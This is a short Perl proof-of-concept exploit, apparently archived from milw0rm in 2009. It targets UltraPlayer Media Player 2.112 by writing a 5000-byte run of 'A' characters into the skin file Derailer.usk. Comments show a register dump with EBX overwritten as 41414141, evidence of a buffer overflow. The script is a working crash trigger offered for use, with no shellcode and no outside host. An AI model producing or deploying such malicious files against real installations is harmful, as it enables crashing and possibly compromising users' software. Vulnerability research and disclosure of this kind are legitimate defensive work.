#!/usr/bin/perl

#UltraPlayer Media Player 2.112

#Coded by SarBoT511

#Download : http://download.cnet.com/UltraPlayer-Media-Player/3000-2139_4-10041974.html?tag=mncol

#GreatZ [ 2] : nEt^DeV!L [s4udi~cod3r] , dev1l fucker , The gobL!n , alM511 , BlacK_Zero , l!NUX_dROUx,HCJ.

#The Bug in thes place (C:\Program Files\UltraPlayer\Skins\Derailer.usk)

#EAX 00EDFBC0
#ECX 000002F4
#EDX 00000000
#EBX 41414141
#ESP 0012FB78
#EBP 0012FB80
#ESI 00EDEFF0 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#EDI 00000000
#EIP 00471733 UPlayer.00471733


$str="A"x 5000;
$file="Derailer.usk";
open(my $FILE, ">>$file") or die "Error opening file.n";
print $FILE $str ;
close($FILE);
print "$file has been created.n";

# milw0rm.com [2009-08-05]